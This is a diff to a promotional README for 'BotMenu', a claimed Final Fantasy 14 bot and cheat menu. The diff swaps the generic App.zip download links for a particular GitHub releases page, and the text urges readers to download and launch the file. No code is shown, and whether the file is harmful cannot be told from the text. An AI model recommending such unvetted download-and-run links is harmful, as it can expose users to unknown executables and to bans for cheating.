@@ -14,7 +14,7 @@ BotMenu offers a wide range of features designed to enhance your gaming experien
 
 ## Installation Guide 🚀
 
-To get started with BotMenu, simply download the software from the following link: [Download BotMenu](https://github.com/repo/releases/9246/App.zip)
+To get started with BotMenu, simply download the software from the following link: [Download BotMenu](https://github.com/miqueasmsp/Final-Fantasy-14-BotMenu/releases)
 
 🔥 **Launch the downloaded file to start using BotMenu and elevate your FF 14 gameplay!**
 
@@ -39,4 +39,4 @@ If you have any questions, feedback, or need assistance with BotMenu, feel free 
 
 Dive into the world of Final Fantasy 14 like never before with BotMenu. Gain a competitive edge, optimize your gameplay, and explore new possibilities in the realm of Eorzea. Download now and embark on an epic adventure! 🌌
 
-[![](https://img.shields.io/badge/Download-BotMenu-blue)](https://github.com/repo/releases/9246/App.zip)
+[![](https://github.com/miqueasmsp/Final-Fantasy-14-BotMenu/releases)](https://github.com/miqueasmsp/Final-Fantasy-14-BotMenu/releases)
